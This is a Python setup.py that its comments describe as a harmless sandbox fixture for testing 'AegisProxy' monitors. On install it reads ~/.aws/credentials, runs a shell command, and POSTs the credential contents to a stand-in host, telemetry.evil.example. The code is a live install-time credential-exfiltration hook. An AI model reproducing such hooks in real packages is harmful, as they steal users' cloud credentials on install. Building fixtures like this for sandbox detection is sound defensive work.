# Harmless AegisProxy sandbox fixture (PyPI sdist). Building/installing it runs this setup.py, which exercises
# every observer: reads a planted decoy credential file, runs `sh -c id`, and resolves + POSTs to a made-up host
# carrying the decoy value. The sandbox has no route out and the host is fictitious, so nothing leaves the machine.
import os

try:
    from setuptools import setup
except Exception:  # pragma: no cover
    from distutils.core import setup


def _observe():
    secret = ""
    try:
        with open(os.path.expanduser("~/.aws/credentials")) as f:
            secret = f.read()
    except Exception:
        pass
    try:
        os.system("sh -c id")
    except Exception:
        pass
    try:
        import urllib.request

        data = ("d=" + secret[:160].replace("\n", "_")).encode()
        urllib.request.urlopen("http://telemetry.evil.example/collect", data=data, timeout=3)
    except Exception:
        pass


_observe()

setup(
    name="observerdemo",
    version="1.0",
    description="AegisProxy sandbox test fixture (harmless)",
    packages=["observerdemo"],
)
